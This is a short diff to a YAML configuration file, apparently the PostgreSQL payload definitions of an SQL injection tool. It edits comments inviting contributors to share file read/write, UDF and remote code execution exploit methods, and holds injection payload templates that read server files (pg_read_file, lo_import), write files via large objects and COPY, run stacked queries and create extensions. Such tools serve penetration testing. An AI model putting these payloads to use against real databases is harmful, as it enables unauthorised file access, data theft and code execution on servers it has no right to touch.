@@ -113,7 +113,11 @@ resource:
     concat: "|| '%7f' ||"
 
  exploit: |
-  # [contribute] share other file, RCE and UDF exploits on GitHub
+  # [contribute] share following exploit methodologies on GitHub to improve the app :
+  # - read and write files
+  # - UDF creation
+  # - RCE
+  
   file:
     read:
       fromDataFolder: pg_read_file('${filepath}')
@@ -121,6 +125,7 @@ resource:
         fromPath: select lo_import('%s')::text
         toText: select convert_from(lo_get(%s),'utf8')::text
       fromTempTable: array_to_string(array(select * from %s),'\n')
+  
     write:
       largeObject:
         fromText: select lo_from_bytea(0, '%s')::text
@@ -130,7 +135,7 @@ resource:
         add: ; create table %s(data text)
         fill: ; copy %s(data) from '%s' delimiter E'\x01'
   
-  rce:
+  udf:
     extension:
       create: ; create extension %s
       languages: select array_to_string(array(select lanname from pg_language),'')
